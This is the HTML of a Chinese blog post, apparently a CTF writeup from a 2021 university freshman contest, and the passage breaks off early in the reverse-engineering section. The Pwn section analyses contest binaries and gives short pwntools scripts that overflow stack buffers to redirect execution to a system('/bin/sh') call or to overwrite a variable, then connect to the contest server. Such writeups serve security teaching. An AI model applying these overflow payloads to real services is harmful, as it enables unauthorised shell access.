@@ -1,0 +1,1440 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Thou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+        
+        
+        
+            <link rel="preconnect" href="https://cdn.staticfile.org" crossorigin>
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://blog.txgde.space/2021/10/25/2021xju 1024ctf挑战赛writeup/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="PWN 1.Pwn指北下载附件直接拉到最下面即可 2.test your nc直接运行题目所给命令即可夺权-nc 116.62.221.105 10001 3.RIP下载附件rip,首先判断是多少位的程序: 64位,放到IDA64中打开分析,找到main函数,F5反编译:  程序定义了一个长32的s字符串用以获取用户输入,但是gets()函数无法判断用户输入了多少个字符,发现溢出点. 接下来找用以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021XJU 1024CTF挑战赛Writeup">
+<meta property="og:url" content="http://blog.txgde.space/2021/10/25/2021XJU%201024CTF%E6%8C%91%E6%88%98%E8%B5%9BWriteup/index.html">
+<meta property="og:site_name" content="童旭光的博客">
+<meta property="og:description" content="PWN 1.Pwn指北下载附件直接拉到最下面即可 2.test your nc直接运行题目所给命令即可夺权-nc 116.62.221.105 10001 3.RIP下载附件rip,首先判断是多少位的程序: 64位,放到IDA64中打开分析,找到main函数,F5反编译:  程序定义了一个长32的s字符串用以获取用户输入,但是gets()函数无法判断用户输入了多少个字符,发现溢出点. 接下来找用以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025000814837.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025001335768.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025214737923.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025215043784.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025215426081.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025221821849.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025221711345.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025222745285.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025223107306.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025223210470.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025223934774.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025224140038.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025224340577.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025224510616.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025224601703.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025224816420.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025225507436.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025225745186.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025225834268.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025002846509.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025003021216.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025003204918.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025003241691.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025003453306.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025003726712.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025004946233.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025005217219.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025005433577.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025005923226.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025010919597.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025011104880.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025011146021.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025011328003.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025011432030.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025011532460.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025012219767.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025012627955.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025015138723.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025014223111.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025015702488.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025015757220.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025015902356.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025020027910.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025020244644.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025020511386.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025020612135.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025153716169.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025154235376.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025154329740.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025154542804.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025154725298.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025154922737.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025155246508.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025155813049.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025160418568.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025160737367.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025161103301.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025161803100.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025161849524.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025161958159.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025162329783.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025203118107.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025203540591.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025204022521.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025225922662.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025204600748.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025204451999.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025205053058.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025230317616.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025230549981.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025205858897.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025205956732.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025211438283.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025211507228.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025211614649.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025211756918.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025211958198.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025212701885.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025212346719.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025213252838.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025213302291.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025213500288.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025213719297.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025213848528.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025213925365.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025214136400.png">
+<meta property="og:image" content="https://image.txg2333.top/2021/10/image-20211025214232394.png">
+<meta property="article:published_time" content="2021-10-25T15:39:25.000Z">
+<meta property="article:modified_time" content="2023-10-31T06:28:03.952Z">
+<meta property="article:author" content="Thou">
+<meta property="article:tag" content="2021">
+<meta property="article:tag" content="Crypto">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Misc">
+<meta property="article:tag" content="Osint">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="XJUSEC">
+<meta property="article:tag" content="XJU新生赛">
+<meta property="article:tag" content="比赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.txg2333.top/2021/10/image-20211025000814837.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://image.txg2333.top/avatar.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://image.txg2333.top/avatar.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://image.txg2333.top/avatar.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2021XJU 1024CTF挑战赛Writeup -
+        
+        Thouの空间
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/assets/build/styles.css">
+    
+
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fonts/fonts.css">
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fonts/Satoshi/satoshi.css">
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fonts/Chillax/chillax.css">
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        <link href="" rel="stylesheet">
+    
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <!-- Matomo --><script data-swup-reload-script>  var _paq = window._paq = window._paq || []; _paq.push(["setDocumentTitle", document.domain + "/" + document.title]);  _paq.push(['trackPageView']);  _paq.push(['enableLinkTracking']);  (function() {    var u="//analyze.txg2333.top:30443/";    _paq.push(['setTrackerUrl', u+'matomo.php']);    _paq.push(['setSiteId', '1']);    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];    g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);  })();</script><!-- End Matomo Code -->
+                
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"blog.txgde.space","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":true,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Welcome to Thouの空间","subtitle":{"text":["Coding coding coding!","Let us code!"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/txgde-space","instagram":null,"zhihu":null,"twitter":null,"email":"tongxuguang23@icloud.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"我的":{"icon":"fa-regular fa-user","submenus":{"个人主页":"http://i.txgde.space","Github":"https://github.com/txgde-space"}}},"search":{"enable":true,"preload":true},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}},"categories":{"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"}}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"好累😭","links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2021/10/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Thouの空间
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        我的&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="http://i.txgde.space">个人主页
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/txgde-space">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                我的&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="http://i.txgde.space">个人主页</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/txgde-space">GITHUB</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">2021XJU 1024CTF挑战赛Writeup</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header flex flex-row gap-2 items-center">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="https://image.txg2333.top/avatar.svg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Thou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2021-10-25 15:39:25</span>
+        <span class="mobile">2021-10-25 15:39:25</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-10-31 06:28:03</span>
+            <span class="mobile">2023-10-31 06:28:03</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/2021/">2021</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Crypto/">Crypto</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Misc/">Misc</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Osint/">Osint</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Reverse/">Reverse</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Web/">Web</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/XJUSEC/">XJUSEC</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/XJU%E6%96%B0%E7%94%9F%E8%B5%9B/">XJU新生赛</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%AF%94%E8%B5%9B/">比赛</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><hr>
+<h3 id="1-Pwn指北"><a href="#1-Pwn指北" class="headerlink" title="1.Pwn指北"></a>1.Pwn指北</h3><p>下载附件直接拉到最下面即可<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025000814837.png"
+                      alt="image-20211025000814837"
+                ></p>
+<h3 id="2-test-your-nc"><a href="#2-test-your-nc" class="headerlink" title="2.test your nc"></a>2.test your nc</h3><p>直接运行题目所给命令即可夺权-<strong>nc 116.62.221.105 10001</strong><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025001335768.png"
+                      alt="image-20211025001335768"
+                ></p>
+<h3 id="3-RIP"><a href="#3-RIP" class="headerlink" title="3.RIP"></a>3.RIP</h3><p>下载附件rip,首先判断是多少位的程序:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025214737923.png"
+                      alt="image-20211025214737923"
+                ><br> 64位,放到IDA64中打开分析,找到main函数,F5反编译:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025215043784.png"
+                      alt="image-20211025215043784"
+                ></p>
+<hr>
+<p>程序定义了一个长32的s字符串用以获取用户输入,但是gets()函数无法判断用户输入了多少个字符,发现溢出点. 接下来找用以夺权的函数,在fun中发现了bin&#x2F;sh:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025215426081.png"
+                      alt="image-20211025215426081"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025221821849.png"
+                      alt="image-20211025221821849"
+                ><br> 转到汇编视图,发现程序在数据段中定义了command字符串,内容为”bin&#x2F;sh”,然后再0x4005BF这个地址将command放到了rdi寄存器中, 然后在后面调用了_system函数(call指令),因此溢出操作后写入0x4005BF这个地址就可以夺权了(以上为我的理解,不是很透彻也可能会有错误) 因此构建以下脚本:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>+<span class="number">8</span>)+p64(<span class="number">0x4005BF</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>
+
+<p>执行脚本成功拿到flag<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025221711345.png"
+                      alt="image-20211025221711345"
+                ></p>
+<h3 id="4-level0"><a href="#4-level0" class="headerlink" title="4.level0"></a>4.level0</h3><p>下载附件检查信息,是个64位程序<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025222745285.png"
+                      alt="image-20211025222745285"
+                ><br> 拖到IDA64中分析找到main函数,F5反编译:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025223107306.png"
+                      alt="image-20211025223107306"
+                ><br> 双击进入函数:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025223210470.png"
+                      alt="image-20211025223210470"
+                ><br> 发现buf长度为128,read()函数允许我们输入0x200个长度的数据,比128大,可以进行溢出操作,然后找夺权函数:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025223934774.png"
+                      alt="image-20211025223934774"
+                ><br> 分析同上题一样,构建脚本:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10003</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">128</span>+<span class="number">8</span>)+p64(<span class="number">0x4011AA</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025224140038.png"
+                      alt="image-20211025224140038"
+                ><br> 得到flag</p>
+<h3 id="5-Guess-number"><a href="#5-Guess-number" class="headerlink" title="5.Guess number"></a>5.Guess number</h3><p>下载附件,分析为64位<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025224340577.png"
+                      alt="image-20211025224340577"
+                ><br> 拖到IDA64,分析:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025224510616.png"
+                      alt="image-20211025224510616"
+                ><br> 双击打开func():<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025224601703.png"
+                      alt="image-20211025224601703"
+                ><br> 发现只要有一个长度为56的v1字符串和一个浮点数v2,而且当v2&#x3D;11.28125,就可以拿到flag,但是发现我们输入的是v1,无法输入v2,继续分析:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025224816420.png"
+                      alt="image-20211025224816420"
+                ><br> 发现v1字符串的地址在-0x40,v2浮点数在-0x08的位置,我们可以将-0x40到-0x08全填满然后将11.28215赋给v2. 这里我们还需要将11.28215转换为16进制:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025225507436.png"
+                      alt="image-20211025225507436"
+                ><br> 在汇编视图,ucomiss比较指令后双击进入后面的数据可以找到11.28215的16进制表示:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025225745186.png"
+                      alt="image-20211025225745186"
+                ><br> 构造以下python脚本:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10004</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x8</span>)+p64(<span class="number">0x41348000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025225834268.png"
+                      alt="image-20211025225834268"
+                ></p>
+<hr>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><hr>
+<h3 id="1-re签到"><a href="#1-re签到" class="headerlink" title="1.re签到"></a>1.re签到</h3><p>下载文件后解压得到<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025002846509.png"
+                      alt="image-20211025002846509"
+                ><br> 然后将其拖入到IDA中并且根据提示按Shift+F12得到如下视图,然后可在其中找到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025003021216.png"
+                      alt="image-20211025003021216"
+                ></p>
+<h3 id="2-game-switch"><a href="#2-game-switch" class="headerlink" title="2.game switch"></a>2.game switch</h3><p>下载附件得到<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025003204918.png"
+                      alt="image-20211025003204918"
